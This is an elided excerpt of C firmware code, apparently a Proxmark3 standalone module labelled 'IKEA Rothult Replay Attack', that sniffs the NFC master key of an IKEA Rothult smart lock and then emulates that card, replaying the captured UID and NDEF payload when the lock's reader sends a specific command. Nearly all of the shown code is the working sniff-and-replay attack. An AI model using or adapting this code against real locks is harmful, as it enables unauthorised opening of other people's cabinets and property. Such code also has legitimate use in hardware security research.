...
{
    StandAloneMode();
    DbpString(_YELLOW_(">>") "IKEA Rothult Replay Attack - Felix Op den Camp" _YELLOW_("<<"));
...
#define DYNAMIC_MODULATION_BUFFER_SIZE 512
    ...
    for (;;)
    {
        ...
        // Initialize UID and NDEF
        uint8_t newData[7] = {0x00};
        uint8_t ndef_len = 31;
        uint8_t newNdef[31] = {0x00};
        bool mastercardFlag = false;

        // Call Rothult Sniff
        SniffRothultTraffic(0, newData, newNdef, mastercardFlag);
        ...
        DbpString("------------------------");
        DbpString("--- Emulate Card: ---");
        
        
        Dbprintf("with UID:");
        Dbhexdump(7, (uint8_t *)newData, false);
        if(mastercardFlag){
            Dbprintf("Data payload:");
            Dbhexdump(ndef_len, (uint8_t *)newNdef, false);
        }


        // data = UID
        if (SimulateIso14443aInit(tagType, flags, newData, &responses, &cuid, counters, tearings, &pages) == false)
        {
            BigBuf_free_keep_EM();
        ...
        for (;;)
        {
            ...
            else if (receivedCmd[1] == 0x20 && receivedCmd[0] == ISO14443A_CMD_ANTICOLL_OR_SELECT_2 && len == 2)
            ...
            else if (receivedCmd[1] == 0x70 && receivedCmd[0] == ISO14443A_CMD_ANTICOLL_OR_SELECT_2 && len == 9)
            ...
            else
            {
                ...
                { // Emulate an ST25TA IKEA Rothult Master Key
                    dynamic_response_info.response[0] = receivedCmd[0];

                    if (memcmp("\x02\xa2\xb0\x00\x00\x1d\x51\x69", receivedCmd, 8) == 0)
                    {
                        DbpString("Reader requires payload:");
                        uint8_t command[8] = {0x02, 0xa2, 0xb0, 0x00, 0x00, 0x1d, 0x51, 0x69};
                        Dbhexdump(8, command, false);
                        // change to newNdef
                        DbpString("Replay payload:");
                        memcpy(dynamic_response_info.response + 1, newNdef, 31);
                        Dbhexdump(ndef_len, (uint8_t *)newNdef, false);
                        DbpString("------------------------");
